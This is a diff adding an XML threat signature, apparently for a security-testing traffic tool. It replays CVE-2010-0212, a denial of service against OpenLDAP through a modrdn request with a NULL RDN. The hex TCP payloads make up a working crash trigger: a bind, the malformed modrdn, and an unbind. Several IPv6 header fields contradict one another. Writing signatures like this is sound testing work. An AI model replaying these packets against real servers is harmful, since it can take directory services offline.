@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="OpenLDAP Modrdn RDN NULL String Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="A vulnerability exists in OpenLDAP. The vulnerability is due to invalid memory access when handling a NULL string in a modrdn request. A remote attacker could exploit this vulnerability by sending a malicious request via a modrdn request to connect to the target server.&#13;&#10;Successful exploitation would allow cause termination of sldapd daemon resulting in a denial of service condition.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="DENIAL_OF_SERVICE"/>
+    </Intent>
+    <Protocol display="true" value="IPv6,LDAP,LDAPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="OpenLDAP_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="OpenLDAP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_2.4.23"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0212"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Will Wang"/>
+    <ID display="true" value="049983d533c2011abfceede3f95071ca"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634227529227804975"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1287135012" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="O"/>
+    <NamedVar name="LDAPdestPort" type="ImperfectControls.Port" value="null" index="P"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+    <for index="F">
+      <for index="O"/>
+      <for index="N"/>
+      <for index="P"/>
+    </for>
+    <for index="H">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+    <for index="J">
+      <for index="O"/>
+      <for index="N"/>
+      <for index="P"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:55:C3:0D" destMac="00:0C:29:63:1A:F1" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="54600" destPort="$LDAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="005C" Checksum="" UrgentPointer="0000" Options="0101080A756B2BAB05A78C7B" Payload="300C020101600702010304008000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="00:0C:29:55:C3:0D" destMac="00:0C:29:63:1A:F1" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="54600" destPort="$LDAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="005C" Checksum="" UrgentPointer="0000" Options="0101080A756B2BAC05A78C7C" Payload="302D0201026C28041E6F753D416C69617365732C64633D6D792D646F6D61696E2C64633D636F6D040364633D010100" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="00:0C:29:55:C3:0D" destMac="00:0C:29:63:1A:F1" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="54600" destPort="$LDAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="005C" Checksum="" UrgentPointer="0000" Options="0101080A756B2BAE05A78C7D" Payload="30050201034200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:63:1A:F1" destMac="00:0C:29:55:C3:0D" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$LDAPdestPort" destPort="54600" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="016A" Checksum="" UrgentPointer="0000" Options="0101080A05A78C7C756B2BAB" Payload="300C02010161070A010004000400" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
